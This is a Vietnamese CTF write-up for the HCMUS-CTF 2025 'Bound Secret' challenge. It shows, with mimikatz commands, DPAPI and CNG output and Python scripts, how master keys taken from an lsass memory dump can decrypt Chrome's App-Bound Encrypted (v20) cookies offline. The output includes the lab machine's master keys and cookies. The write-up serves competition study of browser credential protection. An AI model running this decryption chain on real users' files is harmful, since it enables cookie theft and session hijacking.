# Mô tả

App-Bound Encryption trên Chrome và các trình duyệt nền Chromium là một cơ chế bảo mật mới do Google triển khai bắt đầu từ phiên bản Chrome 127.

Cơ chế này giúp giảm thiểu nguy cơ đánh cắp cookies bằng cách áp dụng hai bước giải mã, yêu cầu sử dụng hai phiên người dùng khác nhau: phiên SYSTEM và phiên của người dùng hiện tại.

Trên GitHub hiện có nhiều repo có khả năng inject vào Chrome để trích xuất cookies trực tiếp từ trình duyệt. Tuy nhiên, các phương pháp này thường yêu cầu toàn quyền kiểm soát máy tính của người dùng để thao tác.

Dựa trên cơ sở đó, người dùng `*bachtam2001*` đã nghiên cứu và tìm ra phương pháp khác để giải mã cookies từ một số file trên máy. Dưới đây là danh sách file và đường dẫn được trích xuất từ hệ thống:

- **Cookies** → `C:\Users\admin\AppData\Local\Google\Chrome\User Data\Default\Network`
- **Local State** → `C:\Users\admin\AppData\Local\Google\Chrome\User Data`
- **dpapi_cng_Google Chromekey1** → `C:\ProgramData\Microsoft\Crypto\SystemKeys`
- **lsass.dmp** → được tạo ra bằng thao tác *"Create memory dump file"* trong Task Manager

Hãy tìm xem anh ấy đã làm như thế nào. Flag được lưu trong cookies. Chúc bạn may mắn!
 File: public.rar

# Phân tích

## Phương pháp giải

Dựa vào mô tả của bài và [repo](https://github.com/runassu/chrome_v20_decryption/blob/main/decrypt_chrome_v20_cookie.py) này thì để decrypt được cookie từ các file chrome một máy khác ta sẽ cần những điều kiện sau:

- Masterkey của USER và SYSTEM, có thể lấy được từ  **lsass.dmp**
- Sau đó dùng 2 masterkey đó để decrypt **app_bound_encrypted_key** lấy được từ **Local State**
- Sau đó phải parse thông tin về `flag, iv, ciphertext, tag` của **app_bound_decrypted_key** đó để biết nó được encrypt bằng cách nào, có 3 cách dựa vào các **flag** 1,2,3:
  - **1**: AES-GCM với key **B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787**
  - **2**: ChaCha20_Poly1305 với key **E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660**
  - **3**: Vẫn là AES-GCM nhưng đặc bệt hơn, sẽ cần phải decrypt `aes key` từ `encrypted DPAPI key` trong file **dpapi_cng_Google Chromekey1**, đây là đoạn khó nhất vì ta chưa biết được `encrypted DPAPI key` được mã hoá bằng phương thức nào (Có cách để tìm ra phương thức mã hoá sử dụng AES bằng **mimikatz** nhưng sau đó vẫn phải đoán mode AES). Rồi sau đó decrypted key sẽ được XOR với **CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390**. Trong bài thì flag của **app_bound_decrypted_key** khi parse ra cũng sẽ là `3`
- Cuối cùng dùng **app_bound_decrypted_key** để giải ra V20 masterkey => Decrypt Cookies

Dưới đây là một số ví dụ trong chương trình khi parse key

```py
def parse_key_blob(blob_data: bytes) -> dict:
    buffer = io.BytesIO(blob_data)
    parsed_data = {}

    header_len = struct.unpack('<I', buffer.read(4))[0]
    parsed_data['header'] = buffer.read(header_len)
    content_len = struct.unpack('<I', buffer.read(4))[0]
    assert header_len + content_len + 8 == len(blob_data)
    
    parsed_data['flag'] = buffer.read(1)[0]
    ###########################################################################
    if parsed_data['flag'] == 1 or parsed_data['flag'] == 2:
        # [flag|iv|ciphertext|tag] decrypted_blob
        # [1byte|12bytes|32bytes|16bytes]
        parsed_data['iv'] = buffer.read(12)
        parsed_data['ciphertext'] = buffer.read(32)
        parsed_data['tag'] = buffer.read(16)
    elif parsed_data['flag'] == 3:
        # [flag|encrypted_aes_key|iv|ciphertext|tag] decrypted_blob
        # [1byte|32bytes|12bytes|32bytes|16bytes]
        parsed_data['encrypted_aes_key'] = buffer.read(32)
        parsed_data['iv'] = buffer.read(12)
        parsed_data['ciphertext'] = buffer.read(32)
        parsed_data['tag'] = buffer.read(16)
    else:
        raise ValueError(f"Unsupported flag: {parsed_data['flag']}")
    ############################################################################
    return parsed_data
```

## Stage 1: Decrypt app_bound_encrypted_key

### USER và SYSTEM masterkey

Trước hết để tìm ra masterkey của 2 phiên ta sẽ sử dụng mimikatz để phân tích **lsass.dmp**

```
mimikatz # sekurlsa::minidump ./lsass.dmp
Switch to MINIDUMP : './lsass.dmp'

mimikatz # sekurlsa::dpapi
Opening : './lsass.dmp' file for minidump...
```

Kết quả trả về:

```
Authentication Id : 0 ; 145936 (00000000:00023a10)
Session           : Interactive from 1
User Name         : admin
Domain            : DESKTOP-VGP37K5
Logon Server      : DESKTOP-VGP37K5
Logon Time        : 28/07/2025 11:08:54 CH
SID               : S-1-5-21-3012274348-1187149480-2072451004-1000
         [00000000]
         * GUID      :  {85daf71b-fd80-43b4-9f86-ac6c9e73df4f}
         * Time      :  29/07/2025 12:39:41 SA
         * MasterKey :  a71e3395183c40328f645896caa1017295c3b1a7e6ed1939c90baf015f32645b2dfde0ab9192602390583705d81edbcbeee582eaaa3165bcc5f7d585e2b71b00
         * sha1(key) :  4729c6898104a522db9c0fc6d0e054ed83701f77
         
###################################################################################################################

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DESKTOP-VGP37K5$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 28/07/2025 11:08:51 CH
SID               : S-1-5-18
         [00000000]
         * GUID      :  {f79976b0-7778-481d-9412-9c5bccecb7cf}
         * Time      :  29/07/2025 12:23:58 SA
         * MasterKey :  cf55c7f9923f1699887bc50a59cde059426b0bd6c94bc954f65d444d5e09716c8cde3333e58944d28b5f3e7d0d72d9eff6a0703a2e5f80fc47860ef53d7e739f
         * sha1(key) :  b77ca9f6c10173417cee50c33b58e51aeeb82889
```

Vậy ta có masterkey của `SYSTEM` là **cf55c7f9923f1699887bc50a59cde059426b0bd6c94bc954f65d444d5e09716c8cde3333e58944d28b5f3e7d0d72d9eff6a0703a2e5f80fc47860ef53d7e739f** 

Và của `USER` là **a71e3395183c40328f645896caa1017295c3b1a7e6ed1939c90baf015f32645b2dfde0ab9192602390583705d81edbcbeee582eaaa3165bcc5f7d585e2b71b00**

### Local State app_bound_encrypted_key

Khi lấy **`app_bound_encrypted_key`** từ `Local State` của Chrome, chuỗi base64 sau khi giải mã sẽ chứa một prefix để Chrome biết loại key, với key App-Bound (`app_bound_encrypted_key`): prefix là **`APPB`** (4 byte `0x41 0x50 0x50 0x42`). Khi sử dụng để giải mã thì ta sẽ không cần đến nó nên sẽ phải loại bỏ

```bash
grep -o '"app_bound_encrypted_key":"[^"]*"' "Local State" | cut -d'"' -f4 | base64 -d | tail -c +5 > app_bound_encrypted_key
```

Bây giờ ta sẽ dùng mimikatz để decrypt 2 lần SYSTEM, USER 

```
mimikatz # dpapi::blob /in:app_bound_encrypted_key /masterkey:cf55c7f9923f1699887bc50a59cde059426b0bd6c94bc954f65d444d5e09716c8cde3333e58944d28b5f3e7d0d72d9eff6a0703a2e5f80fc47860ef53d7e739f /out:key2
**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {f79976b0-7778-481d-9412-9c5bccecb7cf}
  dwFlags            : 00000010 - 16 (audit ; )
  dwDescriptionLen   : 0000001c - 28
  szDescription      : Google Chrome
  algCrypt           : 00006610 - 26128 (CALG_AES_256)
  dwAlgCryptLen      : 00000100 - 256
  dwSaltLen          : 00000020 - 32
  pbSalt             : 15e5b126b9e156f8fd024cea50b953b9abb0b6cfc23d2de2db8151ca80a29207
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         :
  algHash            : 0000800e - 32782 (CALG_SHA_512)
  dwAlgHashLen       : 00000200 - 512
  dwHmac2KeyLen      : 00000020 - 32
  pbHmack2Key        : eed20e1a455910b8a78172f2f8021222b572c9ff7b85400d06eae48b811f391f
  dwDataLen          : 00000190 - 400
  pbData             : 4e89a4c7ea53f73f4391aef7be7591a1e6cbadf8cf8ea37109be80029fc5c6e224ea88a561ecbd12a9afd8f87e183157277bc2123fd8c7d85deb474ea3b860d5cd320d6323752a28af8288e7507cf4c63458b1cdb540a63f8306dfd6e00f14b02c34fb4754c38926179b767743b605e7366d117ad74918b2624b85be68e306c3b38ce938ffd3e8c5ff0ff79d9bd71e01777ecb6fb9661e091f148dfb7b8458df1a3f4bb51c0feab6df5acec5ea9da4f9c6870f4c871229b567894e25e79577e411f2241a03ce9f774437fb589055f669734c4d83049b49975a0b1649f9752d81487d1ba9f50d9230195fb417a8eaa2658a72d378c6c8778db5b5ae271b6d680d84aa2cf1f2393ea28fe7ae5f75bcd68b4775abf3d7464256cb9f61d7dde0487ab9a91127647d9404adee73331fc6f67e10323ebad6e1283e0576db0dc9d1431693374af8e833d1040a8e5bbfb18c2ef3d7bab850d95c0f66a615250b989313f5725fab5f7604a002537382b0134b2e1653700cd85522417c135d51a9aed74218f8fa31e6a3b9f9acc4f5c4ba752faff8
  dwSignLen          : 00000040 - 64
  pbSign             : 9b89e121680d2820632bfd5e7d1979d44e84d38379ba56fc7047de96404244049ef5e746d7237c54d66b006161365e0dde5cb112eb62a7aaad8991edb958cdcf

 * masterkey     : cf55c7f9923f1699887bc50a59cde059426b0bd6c94bc954f65d444d5e09716c8cde3333e58944d28b5f3e7d0d72d9eff6a0703a2e5f80fc47860ef53d7e739f
description : Google Chrome
Write to file 'layer2.bin' is OK

mimikatz # dpapi::blob /in:key2 /masterkey:a71e3395183c40328f645896caa1017295c3b1a7e6ed1939c90baf015f32645b2dfde0ab9192602390583705d81edbcbeee582eaaa3165bcc5f7d585e2b71b00 /out:decrypted_key
**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {85daf71b-fd80-43b4-9f86-ac6c9e73df4f}
  dwFlags            : 00000010 - 16 (audit ; )
  dwDescriptionLen   : 0000001c - 28
  szDescription      : Google Chrome
  algCrypt           : 00006610 - 26128 (CALG_AES_256)
  dwAlgCryptLen      : 00000100 - 256
  dwSaltLen          : 00000020 - 32
  pbSalt             : c6b8658d07d292f2b54e8192a7b1d15444e71ac8517449fc33b9d115470b890b
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         :
  algHash            : 0000800e - 32782 (CALG_SHA_512)
  dwAlgHashLen       : 00000200 - 512
  dwHmac2KeyLen      : 00000020 - 32
  pbHmack2Key        : 9e55b3b15bd0b5a9ca2b90a74389d554b7adba576658b59a08be4dde5e828b74
  dwDataLen          : 00000090 - 144
  pbData             : c445bc801a0021f955f4d886c4cfd81c14e9f9675a6fd8e4a91d78da17f069262b26b057b44c9b321f1efd99eec80b75500d80c71aea6780a733ec6d8105c224621866ac5a3d10e7ac49eda765e1979cd71e281e42b8dbc916f5e4a9000edab53f77b979f2ece5b48b0f26172b355b17b806af07db36534ac583fec51fcf3895248fffd15f5a82dc739025627e3256f5
  dwSignLen          : 00000040 - 64
  pbSign             : bd551bea26aa9349b1381531748803a95a2788885c710be61589303e3b979c53215516a6936fc6bf900d2da93765fc85a4511d16216f31173d15efb4fadf49f3

 * masterkey     : a71e3395183c40328f645896caa1017295c3b1a7e6ed1939c90baf015f32645b2dfde0ab9192602390583705d81edbcbeee582eaaa3165bcc5f7d585e2b71b00
description : Google Chrome
Write to file 'decrypted_key' is OK
```

## Stage 2: Parse key

Để tạo script parse key ta có thể lấy luôn từ repo trên

```py
import os
import io
import sys
import json
import struct
import ctypes
import sqlite3
import pathlib
import binascii

def parse_key_blob(blob_data: bytes) -> dict:
    buffer = io.BytesIO(blob_data)
    result = {}

    header_len = struct.unpack('<I', buffer.read(4))[0]
    result['header'] = buffer.read(header_len)
    content_len = struct.unpack('<I', buffer.read(4))[0]
    assert header_len + content_len + 8 == len(blob_data)

    flag = buffer.read(1)[0]
    result['flag'] = flag

    if flag in (1, 2):
        # [flag|iv|ciphertext|tag] => [1|12|32|16] bytes
        result['iv'] = buffer.read(12)
        result['ciphertext'] = buffer.read(32)
        result['tag'] = buffer.read(16)
    elif flag == 3:
        # [flag|encrypted_aes_key|iv|ciphertext|tag] => [1|32|12|32|16] bytes
        result['encrypted_aes_key'] = buffer.read(32)
        result['iv'] = buffer.read(12)
        result['ciphertext'] = buffer.read(32)
        result['tag'] = buffer.read(16)
    else:
        raise ValueError(f"Unsupported flag: {flag}")

    return result

if __name__ == "__main__":
    f = open("decrypted_key", "rb")
    key = f.read()

    data = parse_key_blob(key)
    for k, v in data.items():
        if isinstance(v, bytes):
            print(f"{k}: {v.hex()}")
        else:
            print(f"{k}: {v}")
```

```
PS C:\Users\admin\Desktop\HCMUS-CTF2025\Bound Secret> python .\parse_key.py
header: 02433a5c50726f6772616d2046696c65735c476f6f676c655c4368726f6d65
flag: 3
encrypted_aes_key: a9cfc5bc8fc1e2ac0072b0a5da97c19225e8f599dbcb326e327a41e25d41a6fe
iv: 08ae4153b5a62f1a522f8234
ciphertext: 8c8c282fed1e705dcb7ae4715f5165c2bd1e8db71520811adf39de76254cdc71
tag: e07c68b0c32f1f120054acaa3efc864b
```

Flag = 3 => dựa vào đoạn code của repo ta có 

```py
    elif parsed_data['flag'] == 3:
        xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
        ### Orginal code ################################################################
###     with impersonate_lsass():
###        decrypted_aes_key = decrypt_with_cng(parsed_data['encrypted_aes_key'])
        #################################################################################
        ### Needed code #################################################################
        decrypted_aes_key = bytes.fromhex("<KEY>")
        #################################################################################
        xored_aes_key = byte_xor(decrypted_aes_key, xor_key)
        cipher = AES.new(xored_aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])
```

Ta cần phải decrypt aes key thủ công do trong code gốc thì tác giả đã sử dụng các dữ liệu trực tiếp từ máy người dùng (Chúng ta không có truy cập vào máy người dùng, chỉ có các file mà bài đưa ra nên không thể dùng cách trong code gốc được) 

Người ra đề cũng đã cho ta thêm dữ liệu là file **dpapi_cng_Google Chromekey1** được lấy từ `C:\ProgramData\Microsoft\Crypto\SystemKeys` vậy ta sẽ phân tích file này

## Stage 3: V20 cookies masterkey

Tóm tắt lại, ta đã có `encrypted_aes_key`: **a9cfc5bc8fc1e2ac0072b0a5da97c19225e8f599dbcb326e327a41e25d41a6fe**

Ta cũng có file  file **dpapi_cng_Google Chromekey1** được lấy từ `C:\ProgramData\Microsoft\Crypto\SystemKeys` trên máy người dùng

Thử dùng mimikatz với masterkey của SYSTEM để giải mã file này

```
mimikatz # dpapi::cng /in:"dpapi_cng_Google Chromekey1" /masterkey:cf55c7f9923f1699887bc50a59cde059426b0bd6c94bc954f65d444d5e09716c8cde3333e58944d28b5f3e7d0d72d9eff6a0703a2e5f80fc47860ef53d7e739f
**KEY (cng)**
  dwVersion             : 00000001 - 1
  unk                   : 00000000 - 0
  dwNameLen             : 00000022 - 34
  type                  : 00010002 - 65538
  dwPublicPropertiesLen : 0000002c - 44
  dwPrivatePropertiesLen: 00000152 - 338
  dwPrivateKeyLen       : 0000011c - 284
  unkArray[16]          : 00000000000000000000000000000000
  pName                 : Google Chromekey1
  pPublicProperties     : 1 field(s)
  **KEY CNG PROPERTY**
    dwStructLen     : 0000002c - 44
    type            : 00000000 - 0
    unk             : 00000000 - 0
    dwNameLen       : 00000010 - 16
    dwPropertyLen   : 00000008 - 8
    pName           : Modified
    pProperty       : 7f7fde8dd8ffdb01

  pPrivateProperties    :
  **BLOB**
    dwVersion          : 00000001 - 1
    guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
    dwMasterKeyVersion : 00000001 - 1
    guidMasterKey      : {f79976b0-7778-481d-9412-9c5bccecb7cf}
    dwFlags            : 00000000 - 0 ()
    dwDescriptionLen   : 0000002e - 46
    szDescription      : Private Key Properties
    algCrypt           : 00006610 - 26128 (CALG_AES_256)
    dwAlgCryptLen      : 00000100 - 256
    dwSaltLen          : 00000020 - 32
    pbSalt             : 43e3d44b20449ae3496c65568acd1a5b720e34f57d1afed75b717b1614d601f3
    dwHmacKeyLen       : 00000000 - 0
    pbHmackKey         :
    algHash            : 0000800e - 32782 (CALG_SHA_512)
    dwAlgHashLen       : 00000200 - 512
    dwHmac2KeyLen      : 00000020 - 32
    pbHmack2Key        : bb07062a61e9206e041824e04a6adf24a99dacc383018b9beb77f7d33554ee80
    dwDataLen          : 00000050 - 80
    pbData             : a0e7fdc2a9c11246194903af82247ebfad82d4c12c52f9210eb9f6d46ee1644e155381a1efec31513516ff8f17eed8c7509cb0f31683c3c16472d7e320d1e26237f61cb5c03442d89db5ba3dd28139d4
    dwSignLen          : 00000040 - 64
    pbSign             : ebceddc31ae16caece02c7e90920016d2b953764734aac0c4d5ac733c63265b6bbf817cfa6e376b435f372c5256b735ddb708d36df29b60d240bd6f0b47b4416

  pPrivateKey           :
  **BLOB**
    dwVersion          : 00000001 - 1
    guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
    dwMasterKeyVersion : 00000001 - 1
    guidMasterKey      : {f79976b0-7778-481d-9412-9c5bccecb7cf}
    dwFlags            : 00000000 - 0 ()
    dwDescriptionLen   : 00000018 - 24
    szDescription      : Private Key
    algCrypt           : 00006610 - 26128 (CALG_AES_256)
    dwAlgCryptLen      : 00000100 - 256
    dwSaltLen          : 00000020 - 32
    pbSalt             : cd30115125180ea40d2a493f3447f9af6cedee938b0ab03b9992637025ac046a
    dwHmacKeyLen       : 00000000 - 0
    pbHmackKey         :
    algHash            : 0000800e - 32782 (CALG_SHA_512)
    dwAlgHashLen       : 00000200 - 512
    dwHmac2KeyLen      : 00000020 - 32
    pbHmack2Key        : 163c2c8fa2ab505b747d785e970323c20c990cc298f551019778731dd8e74b9d
    dwDataLen          : 00000030 - 48
    pbData             : 4dcce0bb0fa818753b8a1b998971b1d101f1d4232d7008ef73e7a9686f066128f1301a97de918e6bceb5b21a7ca4556b
    dwSignLen          : 00000040 - 64
    pbSign             : 4348ddedb0af3365539b04b389f8b59a32d17b87ec2a48caa70eb39187bddce17c65385cf610b98d5aa66fc9d94cb1b0e1b0eb7d1143bf72b6b0ce0fbc31be58

Decrypting Private Properties:
 * volatile cache: GUID:{f79976b0-7778-481d-9412-9c5bccecb7cf};KeyHash:b77ca9f6c10173417cee50c33b58e51aeeb82889
 * masterkey     : cf55c7f9923f1699887bc50a59cde059426b0bd6c94bc954f65d444d5e09716c8cde3333e58944d28b5f3e7d0d72d9eff6a0703a2e5f80fc47860ef53d7e739f
2 field(s)
**KEY CNG PROPERTY**
  dwStructLen     : 00000032 - 50
  type            : 00000003 - 3
  unk             : 00000000 - 0
  dwNameLen       : 0000001a - 26
  dwPropertyLen   : 00000004 - 4
  pName           : Export Policy
  pProperty       : 00000000

**KEY CNG PROPERTY**
  dwStructLen     : 00000018 - 24
  type            : 00000007 - 7
  unk             : 00000000 - 0
  dwNameLen       : 00000000 - 0
  dwPropertyLen   : 00000004 - 4
  pName           :
  pProperty       : 00010000

Decrypting Private Key:
 * volatile cache: GUID:{f79976b0-7778-481d-9412-9c5bccecb7cf};KeyHash:b77ca9f6c10173417cee50c33b58e51aeeb82889
 * masterkey     : cf55c7f9923f1699887bc50a59cde059426b0bd6c94bc954f65d444d5e09716c8cde3333e58944d28b5f3e7d0d72d9eff6a0703a2e5f80fc47860ef53d7e739f
4b44424d0100000020000000e70a1ac71dc5e57296aa972f1fc6a093647e2f540a08f8f330c018d2d5ab47ba
ERROR kull_m_crypto_NCryptImportKey ; NCryptImportKey: 0x80090027
        Private raw export : OK - 'dpapi_cng_0_Google Chromekey1.binary'
```

```bash
xxd "dpapi_cng_0_Google Chromekey1.binary"
00000000: 4b44 424d 0100 0000 2000 0000 e70a 1ac7  KDBM.... .......
00000010: 1dc5 e572 96aa 972f 1fc6 a093 647e 2f54  ...r.../....d~/T
00000020: 0a08 f8f3 30c0 18d2 d5ab 47ba            ....0.....G.
```

Sau khi tìm hiểu một chút thì tôi biết được đầy là file **BCRYPT_KEY_DATA_BLOB** và sẽ có cấu trúc sau

```
[12 byte header] + [32 byte AES_KEY]
```

Vậy ta có key **e70a1ac71dc5e57296aa972f1fc6a093647e2f540a08f8f330c018d2d5ab47ba**

Bây giờ còn thiếu iv và mode. Đến đây buộc phải đoán vì ta không biết được chương trình đã sử dụng mode gì cả. Vậy là sẽ phải thử các mode khác nhau xem decrypted key nào hoạt động được thì sẽ decrypt v20 cookies thành công

Các mode được thử là CFB, OFB, CTR, ECB, CBC/NoPadding, ECB/NoPadding với iv là 16 byte 0

```py
import os
import io
import sys
import json
import struct
import ctypes
import sqlite3
import pathlib
import binascii

from Crypto.Cipher import AES

f = open("decrypted_key", "rb")
key_blob = f.read()

def parse_key_blob(blob_data: bytes) -> dict:
    buffer = io.BytesIO(blob_data)
    result = {}

    header_len = struct.unpack('<I', buffer.read(4))[0]
    result['header'] = buffer.read(header_len)
    content_len = struct.unpack('<I', buffer.read(4))[0]
    assert header_len + content_len + 8 == len(blob_data)

    flag = buffer.read(1)[0]
    result['flag'] = flag

    if flag in (1, 2):
        # [flag|iv|ciphertext|tag] => [1|12|32|16] bytes
        result['iv'] = buffer.read(12)
        result['ciphertext'] = buffer.read(32)
        result['tag'] = buffer.read(16)
    elif flag == 3:
        # [flag|encrypted_aes_key|iv|ciphertext|tag] => [1|32|12|32|16] bytes
        result['encrypted_aes_key'] = buffer.read(32)
        result['iv'] = buffer.read(12)
        result['ciphertext'] = buffer.read(32)
        result['tag'] = buffer.read(16)
    else:
        raise ValueError(f"Unsupported flag: {flag}")

    return result

def derive_v20_master_key(parsed_data: dict) -> bytes:
    if parsed_data['flag'] == 3:
        xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
        # Find the actual key from testing AES modes
        decrypted_aes_key = bytes.fromhex("<ACTUAL_KEY>")
        xored_aes_key = bytearray(a ^ b for a, b in zip(decrypted_aes_key, xor_key))
        cipher = AES.new(xored_aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])

    return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])
    
enc_key = parse_key_blob(key_blob)
v20_master_key = derive_v20_master_key(enc_key)
print(f"---------- V20 MASTER KEY ----------\n{v20_master_key.hex()}")

def decrypt_cookie_v20(encrypted_value):
        cookie_iv = encrypted_value[3:3+12]
        encrypted_cookie = encrypted_value[3+12:-16]
        cookie_tag = encrypted_value[-16:]
        cookie_cipher = AES.new(v20_master_key, AES.MODE_GCM, nonce=cookie_iv)
        decrypted_cookie = cookie_cipher.decrypt_and_verify(encrypted_cookie, cookie_tag)
        return decrypted_cookie[32:].decode('utf-8')

cookie_db_path = "Cookies"
abs_cookie_db_path = pathlib.Path(cookie_db_path).resolve()
con = sqlite3.connect(abs_cookie_db_path.as_uri() + "?mode=ro", uri=True)
cur = con.cursor()
r = cur.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB) from cookies;")
cookies = cur.fetchall()
cookies_v20 = [c for c in cookies if c[2][:3] == b"v20"]
con.close()

print("\n---------- DECRYPTED DATA ----------\n")
for c in cookies_v20:
        print(c[0], c[1], decrypt_cookie_v20(c[2]))
```

Sau một hồi thì tôi đã sử dụng được mode `CBC/NoPadding` với iv là 16 byte 0

**7db0346181bb695b4d6d627729d3bf6e0cddcb4968dd8d32ae221f9504d9bf92**

Nếu key đúng thì chạy đoạn code trên sẽ cho ta flag (Nếu sai chương tình sẽ báo `MAC check failed`)

```
PS C:\Users\admin\Desktop\HCMUS-CTF2025\Bound Secret> python .\v20cookies_decrypt.py
---------- V20 MASTER KEY ----------
c5c73ab1dfe69b72a000cf30942ff84f323667f981ee573cfdaff49e7ec9a8ed

---------- DECRYPTED DATA ----------

.google.com AEC AVh_V2jY0s1evp8dGSLjpy4aNltQot5D64NMd-QoFFTFB4k0YxlHsND6sw
.google.com SNID ABablncT7E3gWx4ikh33SB2Pf1cFz7D5f5LuUL4Vk2g1Q2lGum2C0ihB4HjUndNognqmKb0AZNu2bX0wrBBn8nGYFCPWAowF_w
.github.com _octo GH1.1.1509303792.1753718985
.github.com logged_in no
chromewebstore.google.com OTZ 8190279_28_28__28_
ogs.google.com OTZ 8190279_28_28__28_
www.google.com DV 82JYn7BueKQbcNh6fbLcG-i2DqEihRk
.google.com NID 525=AB07pPmS2OWeMVq5C7PGYGJkTro_aFW2u1hmHXjKdCu26O9Dnmszy3x7yGdoqbsIfgBnBGe1KfBYjlisYxd8kDF1wcJUq_pMKEZPGfohENIqZ5Co_qF6gqlPi76PhFlynSB2XjqBeI0v9qHxVQH3bIwudBQObsLzq-G3Kmx6qf3AyZYGj_xDuceSs7aEfCoiz9Ux5LPCGMRuEgq_6R2NS0eEj_8mxG4lM-E0CWbTXLqcaiP2MLnSB0nxcFks2J37bKf-
.twitter.com __cf_bm wbJTmXZUUk2saxaQOPD_RhN4B0qr6BRG1e_pJnGrJtM-1753725154-1.0.1.1-CMcBeRCjewhrQu_nwwNLpROT9xCVssf_cXiFAFbg5t7lfrS1VEKaMcIKw1wydByTPl_htOemAjloAhtxXudFOv7K4iyEf4.kD9aCmn999LE
.chromewebstore.google.com _ga GA1.1.110669706.1753720762
.chromewebstore.google.com _ga_C2WJL5J9RY GS2.1.s1753725147$o1$g0$t1753725151$j56$l0$h0
.chromewebstore.google.com _ga_KHZNC1Q6K0 GS2.1.s1753725147$o2$g0$t1753725151$j56$l0$h0
blackpinker.com flag HCMUS-CTF{Chr0m3_v20_3ncrypt10n_1s_2_e4sy}
```

# Flag

`HCMUS-CTF{Chr0m3_v20_3ncrypt10n_1s_2_e4sy}`
